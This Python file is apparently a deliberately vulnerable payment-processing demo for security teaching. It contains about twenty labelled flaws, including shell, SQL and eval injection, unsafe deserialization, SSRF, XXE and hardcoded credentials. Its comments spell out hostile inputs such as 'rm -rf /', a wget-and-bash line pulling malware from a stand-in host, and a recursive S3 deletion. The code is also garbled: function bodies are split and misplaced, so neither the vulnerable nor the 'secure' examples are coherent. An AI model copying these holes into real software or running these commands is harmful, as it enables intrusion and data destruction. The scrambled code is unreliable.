#!/usr/bin/env python3
"""
Payment Data Processor - INTENTIONALLY VULNERABLE FOR DEMO

Vulnerabilities:
1. Command Injection
2. SQL Injection
3. Path Traversal
4. Hardcoded Credentials
5. Insecure Deserialization
6. XXE (XML External Entity)
7. Unsafe YAML loading
"""

import os
import sys
import subprocess
import mysql.connector
import pickle
import yaml
import xml.etree.ElementTree as ET

# ============================================
# VULNERABILITY 1: Hardcoded Database Credentials
# CWE-798
# ============================================
DB_HOST = "prod-db.bank.internal"
DB_USER = "admin"
DB_PASSWORD = "Pr0dP@ssw0rd123!"  # VULNERABLE!
DB_NAME = "payments_db"

# VULNERABILITY 2: Hardcoded API Keys
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"  # VULNERABLE!
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # VULNERABLE!


def process_payment_file(filename):
    """
    VULNERABILITY 3: Command Injection
    CWE-78
    User input directly used in shell command
    """
    # VULNERABLE: User-controlled filename in shell command
    # Exploit: filename = "data.csv; rm -rf / #"
    command = f"cat /data/payments/{filename} | wc -l"
    
    try:
        # VULNERABLE: Using shell=True with unsanitized input
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print(f"Processed {result.stdout.strip()} records")
        return result.stdout
    except Exception as e:
        print(f"Error: {e}")
        return None


def export_payments_to_csv(output_file, query_filter):
    """
    VULNERABILITY 4: SQL Injection
    CWE-89
    Direct string concatenation in SQL query
    """
    try:
        conn = mysql.connector.connect(
            host=DB_HOST,
            user=DB_USER,
            password=DB_PASSWORD,
            database=DB_NAME
        )
        cursor = conn.cursor()
        
        # VULNERABLE: SQL Injection via string concatenation
        # Exploit: query_filter = "1=1; DROP TABLE payments--"
        sql = f"SELECT * FROM payments WHERE {query_filter}"
        
        print(f"Executing SQL: {sql}")  # VULNERABILITY: Logging SQL queries
        
        cursor.execute(sql)
        results = cursor.fetchall()
        
        # VULNERABILITY 5: Path Traversal
        # User can write to arbitrary locations
        # Exploit: output_file = "../../etc/passwd"
        with open(output_file, 'w') as f:
            for row in results:
                f.write(','.join(str(col) for col in row) + '\n')
        
        cursor.close()
        conn.close()
        
        print(f"Exported {len(results)} payments to {output_file}")
        
    except Exception as e:
        # VULNERABILITY 6: Error Information Disclosure
        print(f"Database error: {str(e)}")
        import traceback
        traceback.print_exc()


def generate_report(report_type, parameters):
    """
    VULNERABILITY 7: Command Injection via system()
    CWE-78
    """
    # VULNERABLE: Unsanitized parameters in shell command
    # Exploit: parameters = "; wget http://malicious.com/malware.sh -O /tmp/m.sh; bash /tmp/m.sh #"
    
    if report_type == "daily":
        cmd = f"python3 /opt/reports/daily_report.py {parameters}"
    elif report_type == "monthly":
        cmd = f"python3 /opt/reports/monthly_report.py {parameters}"
    else:
        cmd = f"python3 /opt/reports/custom_report.py {parameters}"
    
    # VULNERABLE: os.system() with unsanitized input
    os.system(cmd)


def load_configuration(config_file):
    """
    VULNERABILITY 8: Insecure Deserialization
    CWE-502
    Loading pickled data from untrusted source
    """
    # VULNERABLE: pickle.load() from user-controlled file
    # Can execute arbitrary Python code
    with open(config_file, 'rb') as f:
        config = pickle.load(f)  # DANGEROUS!
    
    return config



    return payments


def load_yaml_config(yaml_file):
    """
    VULNERABILITY 10: Unsafe YAML Deserialization
    CWE-502
    """
    with open(yaml_file, 'r') as f:
        # VULNERABLE: yaml.load() without Loader (allows arbitrary code execution)
        # Should use yaml.safe_load()
        config = yaml.load(f, Loader=yaml.FullLoader)  # Still vulnerable
    
    return config


def execute_data_migration(source_db, migration_script):
    """
    VULNERABILITY 11: OS Command Injection with eval()
    CWE-95
    """
    # VULNERABLE: Using eval() on user input
    # Exploit: migration_script = "__import__('os').system('rm -rf /')"
    
    migration_params = {
        'source': source_db,
        'target': DB_NAME,
        'credentials': {'user': DB_USER, 'password': DB_PASSWORD}
    }
    
    # DANGEROUS: eval() executes arbitrary code
    result = eval(f"execute_migration({migration_params}, '{migration_script}')")
    
    return result


def backup_to_s3(bucket_name, file_path):
    """
    VULNERABILITY 12: Hardcoded AWS Credentials + Command Injection
    """
    # VULNERABLE: Exposing AWS credentials
    os.environ['AWS_ACCESS_KEY_ID'] = AWS_ACCESS_KEY
    os.environ['AWS_SECRET_ACCESS_KEY'] = AWS_SECRET_KEY
    
    # VULNERABLE: Command injection in aws CLI command
    # Exploit: file_path = "data.csv; aws s3 rm s3://bucket --recursive #"
    command = f"aws s3 cp {file_path} s3://{bucket_name}/"
    
    os.system(command)


def search_payments(search_term):
    """
    VULNERABILITY 13: NoSQL Injection (MongoDB)
    """
    from pymongo import MongoClient
    
    # VULNERABLE: Hardcoded MongoDB credentials
    client = MongoClient('mongodb://admin:M0ng0P@ss!@prod-mongo.bank.internal:27017/')
    db = client['payments']
    
    # VULNERABLE: NoSQL injection if search_term contains MongoDB operators
    # Exploit: search_term = {"$gt": ""}
    results = db.payments.find({'description': search_term})
    
    return list(results)


def sanitize_filename(filename):
    """
    VULNERABILITY 14: Insufficient Input Validation
    Weak sanitization that can be bypassed
    """
    # VULNERABLE: Insufficient validation
    # Can be bypassed with ..././etc/passwd or URL encoding
    
    # Removes only single instance of ../
    cleaned = filename.replace('../', '')
    
    return cleaned



    payments = []
    for payment in root.findall('payment'):
        payments.append({
            'id': payment.find('id').text,
            'amount': payment.find('amount').text,
            'account': payment.find('account').text
        })

def download_payment_receipt(receipt_url):
    """
    VULNERABILITY 15: Server-Side Request Forgery (SSRF)
    CWE-918
    """
    import urllib.request
    
    # VULNERABLE: No URL validation, allows internal network access
    # Exploit: receipt_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    
    try:
        response = urllib.request.urlopen(receipt_url)
        data = response.read()
        return data
    except Exception as e:
        print(f"Download error: {e}")
        return None


def process_payment_batch(batch_file):
    """
    VULNERABILITY 16: Race Condition
    TOCTOU (Time-of-check Time-of-use)
    """
    # VULNERABLE: Race condition between check and use
    if os.path.exists(batch_file):
        # File could be modified/deleted here by attacker
        with open(batch_file, 'r') as f:
            data = f.read()
        
        # Process data
        process_data(data)


def log_payment_transaction(transaction_data):
    """
    VULNERABILITY 17: Log Injection
    CWE-117
    """
    # VULNERABLE: User input in logs without sanitization
    # Exploit: transaction_data['user'] = "admin\n[ERROR] Fake error message"
    
    print(f"[INFO] Payment processed by user: {transaction_data['user']}")
    print(f"[INFO] Amount: {transaction_data['amount']}")
    print(f"[INFO] Account: {transaction_data['account']}")


def parse_payment_xml(xml_file):
    """
    VULNERABILITY 9: XML External Entity (XXE) Attack
    CWE-611
    """
    # VULNERABLE: Not disabling external entity processing
    # Allows reading arbitrary files from server
    # Exploit XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    
    tree = ET.parse(xml_file)
    root = tree.getroot()
    
    


def calculate_payment_hash(payment_data):
    """
    VULNERABILITY 18: Weak Cryptographic Hash (MD5)
    CWE-327
    """
    import hashlib
    
    # VULNERABLE: Using MD5 for data integrity
    # Should use SHA-256 or stronger
    payment_string = f"{payment_data['id']}{payment_data['amount']}{payment_data['account']}"
    hash_value = hashlib.md5(payment_string.encode()).hexdigest()
    
    return hash_value


def connect_to_payment_api(endpoint):
    """
    VULNERABILITY 19: Disabled SSL Verification
    CWE-295
    """
    import requests
    
    # VULNERABLE: Disabled SSL certificate verification
    response = requests.get(
        f"https://api.bank.com/{endpoint}",
        verify=False  # DANGEROUS!
    )
    

    command = sys.argv[1]
    
    # VULNERABILITY 20: Unrestricted Command Execution
    if command == "process":
        filename = sys.argv[2] if len(sys.argv) > 2 else "default.csv"
        process_payment_file(filename)
    
    elif command == "export":
        output = sys.argv[2] if len(sys.argv) > 2 else "export.csv"
        query = sys.argv[3] if len(sys.argv) > 3 else "status='PENDING'"
        export_payments_to_csv(output, query)
    
    elif command == "report":
        report_type = sys.argv[2] if len(sys.argv) > 2 else "daily"
        params = ' '.join(sys.argv[3:]) if len(sys.argv) > 3 else ""
        generate_report(report_type, params)
    
    elif command == "backup":
        bucket = sys.argv[2] if len(sys.argv) > 2 else "bank-backups"
        file_path = sys.argv[3] if len(sys.argv) > 3 else "/data/backup.sql"
        backup_to_s3(bucket, file_path)
    
    else:
        print(f"Unknown command: {command}")


if __name__ == "__main__":
    main()


# CORRECT EXAMPLES (for comparison)
# ===================================

def secure_command_execution(filename):
    """SECURE: Using parameterized command execution"""
    import shlex
    
    # Validate filename first
    if not filename.endswith('.csv'):
        raise ValueError("Invalid file type")
    
    # Use subprocess with list (no shell=True)
    result = subprocess.run(
        ['wc', '-l', f'/data/payments/{filename}'],
        capture_output=True,
        text=True
    )
    
    return result.stdout


def secure_sql_query(query_filter):
    """SECURE: Using parameterized queries"""
    conn = mysql.connector.connect(
        host=os.environ.get('DB_HOST'),
        user=os.environ.get('DB_USER'),
        password=os.environ.get('DB_PASSWORD'),
        database=os.environ.get('DB_NAME')
    )
    
    cursor = conn.cursor()


        return response.json()


def main():
    """
    Main function with multiple vulnerabilities
    """
    if len(sys.argv) < 2:
        print("Usage: python data_processor.py <command> [args]")
        sys.exit(1)
    
    
    # Use parameterized query
    sql = "SELECT * FROM payments WHERE status = %s AND amount > %s"
    cursor.execute(sql, (query_filter['status'], query_filter['amount']))
    
    results = cursor.fetchall()
    cursor.close()
    conn.close()
    
    return results


def secure_file_write(output_file, data):
    """SECURE: Validate path and use safe directory"""
    import pathlib
    
    # Validate output path
    safe_dir = pathlib.Path('/var/exports/')
    output_path = (safe_dir / output_file).resolve()
    
    # Ensure path is within safe directory
    if not str(output_path).startswith(str(safe_dir)):
        raise ValueError("Invalid output path")
    
    with open(output_path, 'w') as f:
        f.write(data)
